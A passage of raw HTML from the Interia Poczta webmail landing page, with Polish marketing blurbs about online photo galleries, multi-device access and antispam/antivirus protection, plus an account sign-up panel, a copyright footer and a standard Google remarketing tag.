bolder">pięknej galerii on-line</span> </p> </div> <div class="benefit-body"> <div class="border-center"></div> <ul> <li>Twoje zdjęcia prezentują się jeszcze lepiej, a&nbsp;ich przeglądanie jest wygodniejsze niż pobieranie załaczników </li> <li>Nie musisz korzystac z dodatkowych aplikacji, wszystko co potrzebujesz to Twoja Poczta Interia </li> </ul> </div> </div> <div class="right"> <img class="lazy lazy--no-js-hide" data-original="https://o.iplsc.com/d/img/next/benefits/galerie.png" alt="galerie pocztowe"> <noscript> <img src="https://o.iplsc.com/d/img/next/benefits/galerie.png" alt="galerie pocztowe"> </noscript> </div> </div> </div> <div id="phone-connect" class="benefits-element phone-connect"> <div class="arrow-box"> <div class="border border-left"></div> <div class="arrow"><a href="#phone-connect" class="nav-arrow"></a></div> <div class="border border-right"></div> </div> <div class="benefits-element-center"> <div class="left"> <div class="benefit-head"> <h3>podłącz telefon tablet... lub lodówkę</h3> <p>nowa poczta to nowoczesny design, którym możesz się cieszyć na każdym urządzeniu</p> </div> <div class="benefit-body"> <div class="border-center"></div> <ul> <li>Komputer, tablet, smartfon - bądź zawsze na bieżąco</li> <li>Twoja poczta, zawsze blisko Ciebie</li> </ul> </div> </div> <div class="right"> <img class="normal lazy lazy--no-js-hide" data-original="https://o.iplsc.com/d/img/next/benefits/lodowka.png" alt="telefon tablet"> <noscript> <img class="normal" src="https://o.iplsc.com/d/img/next/benefits/lodowka.png" alt="telefon tablet"> </noscript> <img class="mirror lazy lazy--no-js-hide" data-original="https://o.iplsc.com/d/img/next/benefits/lodowka-l.png" alt="telefon tablet"> <noscript> <img class="mirror" src="https://o.iplsc.com/d/img/next/benefits/lodowka-l.png" alt="telefon tablet"> </noscript> </div> </div> </div> <div id="safety" class="benefits-element safety"> <div class="arrow-box"> <div class="border border-left"></div> <div class="arrow"><a href="#safety" class="nav-arrow"></a></div> <div class="border border-right"></div> </div> <div class="benefits-element-center"> <div class="left"> <div class="benefit-head"> <h3>bezpieczeństwo</h3> <p>możesz spać spokojnie. nasza niewidzialna ochrona zadba o&nbsp;bezpieczeństwo <span class="green bolder">twojej poczty</span> </p> </div> <div class="benefit-body"> <div class="border-center"></div> <ul> <li>Skuteczny system antyspamowy</li> <li>Zabezpieczenie przed wirusami</li> </ul> </div> </div> <div class="right"> <img class="lazy lazy--no-js-hide" data-original="https://o.iplsc.com/d/img/next/benefits/bezpieczenstwo.png" alt="bezpieczenstwo"> <noscript> <img src="https://o.iplsc.com/d/img/next/benefits/bezpieczenstwo.png" alt="bezpieczenstwo"> </noscript> </div> </div> </div> <div class="arrow-box"> <div class="border border-left"></div> <div class="arrow"><a class="nav-arrow"></a></div> <div class="border border-right"></div> </div> </div> </div> <script>Account.Form.initForm();</script> </div> </div> </div> </div> <div id="createaccount" class="login-account-panel login-account-panel--bottom"> <div class="login-account-panel-content"> <h3>załóż konto już dziś</h3> <p>U nas możesz być spokojny o&nbsp;swoją pocztę. Wszystko czego szukasz, będzie pod ręką. Już nie utoniesz w&nbsp;spamie!</p> <span class="login-account-support">Pełne wsparcie</span> <a class="new-account" href="https://konto-pocztowe.interia.pl/#/nowe-konto"> <span>Załóż <span class="new-account-extra">nowe</span> konto</span> </a> </div> </div> <footer> <div id="footer"> <div class="box commonCopyright" id="commonCopyright1"> <div class="boxBegin"></div> <div class="boxHeader"> </div> <div class="boxBody"> <div class="copyright"> <p><strong>Copyright © 1999-2020 <a target="_blank" href="http://firma.interia.pl/o_firmie">INTERIA.PL</a></strong> <strong>Wszystkie prawa zastrzeżone.</strong> <strong>Korzystanie z portalu oznacza akceptację</strong> <strong><a target="_blank" href="http://firma.interia.pl/dzialalnosc/regulamin">Regulaminu</a>. <a target="_blank" href="http://firma.interia.pl/polityka-cookies">Polityka Cookies</a>.</strong></p> </div> </div> <div class="boxEnd"></div> </div> </div> </footer> </div> <div id="createaccount2" class="login-account-panel login-account-panel--bottom-fixed"> <a class="frameButton frame-button--below" id="toBelow"></a> <a class="frameButton" id="toTop"></a> <div class="login-account-panel-content"> <div> <span>Nie masz jeszcze konta.</span> <span>Załóż je już dziś.</span> </div> <a class="new-account" href="https://konto-pocztowe.interia.pl/#/nowe-konto"> <span>Załóż <span class="new-account-extra">nowe</span> konto</span> </a> </div> </div> </div> <!-- Google Code for Poczta Remarketing List --> <script> var google_conversion_id = 1066145596, google_conversion_language = "en", google_conversion_format = "3", google_conversion_color = "666666", google_conversion_label = "sQtiCNyNigIQvK6w_AM", google_conversion_value = 0; </script> <script src="//www.googleadservices.com/pagead/conversion.js">
</script> <noscript> <div style="display:inline;"> <img height="1" width="1" style="border-style:none;" alt="" src="//www.googleadservices.com/pagead/conversion/1066145596/?label=sQtiCNyNigIQvK6w_AM&amp;guid=ON&amp;script=0"/> </div> </noscript>